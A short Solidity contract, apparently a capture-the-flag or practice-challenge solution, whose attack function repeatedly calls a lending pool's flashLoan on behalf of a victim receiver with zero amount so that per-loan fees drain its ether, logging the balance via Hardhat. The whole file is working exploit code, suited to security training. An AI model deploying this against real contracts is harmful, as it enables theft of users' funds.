// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

import "hardhat/console.sol";

contract NaiveExploit {
  using Address for address;

  function attack(address _pool, address _receiver) external {
    uint256 bal = _receiver.balance;
    console.log("initial balance %s", bal / 1 ether);
    while (bal >= 1 ether) {
      _pool.functionCallWithValue(
        abi.encodeWithSignature("flashLoan(address,uint256)", _receiver, 0),
        0
      );
      console.log(
        "Flash loan iteration, current balance %s",
        _receiver.balance / 1 ether
      );
      bal -= 1 ether;
    }
  }
}
